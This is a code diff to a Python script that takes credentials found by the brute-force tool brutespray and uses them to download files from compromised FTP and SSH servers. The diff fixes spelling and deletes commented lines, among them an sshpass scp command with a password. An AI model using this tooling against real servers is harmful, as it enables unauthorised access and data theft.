@@ -100,10 +100,9 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 	# get files from brutespray
 	ftp_file = Path("./brutespray-output/21-ftp-success.txt")
 	ssh_file = Path("./brutespray-output/22-ssh-success.txt")
-	# mysql_file = Path("./brutespray-output/3306-mysql-success.txt")
 	# grab files from ftp servers
 	if ftp_file.is_file():
-		print("==== retreiving info from ftp servers")
+		print("==== retrieving info from ftp servers")
 		make_ftp_folder()
 		with open("./brutespray-output/21-ftp-success.txt", "r") as f:
 			for line in f:
@@ -122,7 +121,7 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 						get_ftp_files(match.group(1), match.group(2), match.group(3), args.filepath, args.ftp_recursion_depth, args.verbose)
 	# get scp files
 	if ssh_file.is_file():
-		print("==== retreiving info from ssh servers")
+		print("==== retrieving info from ssh servers")
 		make_ssh_folder()
 		with open("./brutespray-output/22-ssh-success.txt", "r") as f:
 			for line in f:
@@ -140,8 +139,3 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|    \n \
 						get_ssh_files(match.group(1), match.group(2), match.group(3), args.filepath)
 
 	print("Elapsed time: ", time.time() - start_time, 's')
-# maybe use this vvv for ssh
-# sshpass -p 'SuperStrongPassword' scp -C -r admin@192.168.111.142:/home/admin .
-
-	#show_cracked_info()
-	#print("===== Cracked info ========")
